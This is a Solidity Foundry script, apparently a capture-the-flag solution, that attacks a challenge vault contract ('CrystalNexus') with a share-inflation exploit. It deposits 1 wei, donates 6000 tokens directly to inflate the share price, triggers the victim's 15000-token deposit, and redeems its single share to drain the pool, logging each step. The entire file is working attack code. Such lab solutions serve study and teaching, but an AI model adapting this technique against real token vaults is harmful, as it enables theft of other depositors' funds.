// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Setup.sol";   
import "../src/CrystalNexus.sol";
import "../src/Essence.sol";

contract ExploitScript is Script {
    function run() external {
        // Load credentials from environment variables
        uint256 attackerPrivateKey = vm.envUint("PRIVKEY");
        address attackerWallet = vm.addr(attackerPrivateKey);
        address setupAddress = vm.envAddress("SETUP_CONTRACT_ADDR");

        // Initialize contract instances
        Setup targetSetup = Setup(setupAddress);
        CrystalNexus targetNexus = targetSetup.nexus();
        Essence targetEssence = targetSetup.essence();

        vm.startBroadcast(attackerPrivateKey);

        console.log("Initial Essence Balance:", targetEssence.balanceOf(attackerWallet) / 1 ether);

        // Step 1: Approve targetNexus to spend our targetEssence
        targetEssence.approve(address(targetNexus), type(uint256).max);

        // Step 2: Attune with 1 wei to get 1 wei of totalCrystals
        targetNexus.attune(1);
        console.log("Attuned 1 wei. Total Crystals:", targetNexus.totalCrystals());

        // Step 3: Inflate the amplitude by transferring 6000 ether directly to targetNexus
        targetEssence.transfer(address(targetNexus), 6000 ether);
        console.log("Transferred 6000 ether. Amplitude:", targetNexus.amplitude() / 1 ether);

        // Step 4: Trigger targetSetup to deposit 15000 ether
        targetSetup.conductRituals();
        console.log("Rituals conducted. Nexus Amplitude:", targetNexus.amplitude() / 1 ether);

        // Step 5: Dissolve our 1 wei of totalCrystals to drain the pool
        targetNexus.dissolve(1, attackerWallet);

        // Verify the win condition
        uint256 finalBalance = targetEssence.balanceOf(attackerWallet);
        console.log("Final Essence Balance:", finalBalance / 1 ether);
        
        bool isSolvedStatus = targetSetup.isSolved();
        console.log("Is Solved?", isSolvedStatus);

        vm.stopBroadcast();
    }
}
